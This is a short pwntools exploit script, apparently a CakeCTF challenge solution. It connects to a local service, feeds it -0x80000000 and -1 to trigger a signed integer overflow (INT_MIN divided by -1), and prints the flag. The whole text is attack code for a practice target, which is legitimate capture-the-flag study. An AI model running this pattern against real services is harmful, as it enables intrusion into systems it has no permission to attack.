from pwn import *

s = remote('localhost', 9002)
s.sendlineafter(b'> ', b'4')
s.sendlineafter(b'value: ', str(-0x80000000).encode())
s.sendlineafter(b'> ', b'3')
s.sendlineafter(b'value: ', str(-1).encode())
s.sendlineafter(b'> ', b'7')
s.sendlineafter(b'x = ', str(-0x80000000).encode())
s.recvuntil('CakeCTF')
print(b'CakeCTF' + s.recvall())
